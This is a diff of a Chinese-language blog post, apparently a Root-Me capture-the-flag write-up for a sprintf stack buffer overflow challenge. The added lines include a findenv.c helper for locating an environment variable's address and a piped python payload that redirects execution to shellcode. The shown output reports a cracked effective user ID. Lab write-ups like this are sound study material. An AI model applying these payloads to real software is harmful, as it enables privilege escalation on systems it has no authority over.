@@ -3914,7 +3914,7 @@ int sprintf(char *restrict s, const char *restrict format, ...);</code></pre>
 <hr>
 <p>可以指定宽度，不足的左边补空格：<br>    sprintf(s, “%8d%8d”, 123, 4567); //产生：” 123 4567”</p>
 <hr>
-<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p><code>char *s1 @ ebp-0x414 </code> 输入放在这里</p>
+<h3 id="得到段错误"><a href="#得到段错误" class="headerlink" title="得到段错误"></a>得到段错误</h3><p><code>char *s1 @ ebp-0x414 </code> 输入放在这里</p>
 <p>push ebp<br>此时esp 指向ebp内的值</p>
 <p><code>0x804858b &lt;main+133&gt;:        lea    eax,[ebp-0x408]</code><br>存放buffer</p>
 <pre><code>gdb-peda$ x/1s $ebp-0x408
@@ -3933,6 +3933,20 @@ int sprintf(char *restrict s, const char *restrict format, ...);</code></pre>
 
 <p>palyload:<br>(python -c “print ‘%117x’ + ‘\x0c\xfe\xff\xbf’”;cat) | ./ch17</p>
 <p>但是报段错误，还没想到原因。</p>
+<h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><p>原因应该是gdb内外的地址是不一样的<br><a href="https://github.com/s1syphu5/RootMe-Challenges/tree/master/System/ELF%20x86%20-%20Stack%20buffer%20overflow%20basic%204">https://github.com/s1syphu5/RootMe-Challenges/tree/master/System/ELF%20x86%20-%20Stack%20buffer%20overflow%20basic%204</a><br>使用这篇中的findenv.c</p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *ptr;</span><br><span class="line">    <span class="keyword">if</span>(argc&lt;<span class="number">3</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Usage: %s &lt;environment var&gt; &lt;target program name&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ptr = getenv(argv[<span class="number">1</span>]);</span><br><span class="line">    ptr += (<span class="built_in">strlen</span>(argv[<span class="number">0</span>]) - <span class="built_in">strlen</span>(argv[<span class="number">2</span>])) * <span class="number">2</span>;  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s will be at %p\n&quot;</span>, argv[<span class="number">1</span>], ptr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>使用touch，vim命令创建文件</p>
+<pre><code>app-systeme-ch17@challenge02:~$ /tmp/findenv SHELLCODE ./ch17
+SHELLCODE will be at 0xbffffe31
+
+
+app-systeme-ch17@challenge02:~$ (python -c &quot;print &#39;%117x&#39;+&#39;\x31\xfe\xff\xbf&#39;&quot; ;
+cat ) | ./ch17
+Username: Bad username: %117x1þÿ¿
+id
+uid=1117(app-systeme-ch17) gid=1117(app-systeme-ch17) euid=1217(app-systeme-ch17
+-cracked) groups=1117(app-systeme-ch17),100(users)</code></pre>
 <h3 id="学到的命令"><a href="#学到的命令" class="headerlink" title="学到的命令"></a>学到的命令</h3><p><code>show env PATH</code></p>
 <p><code>echo $PATH</code></p>
 <p>%x 打印32位</p>
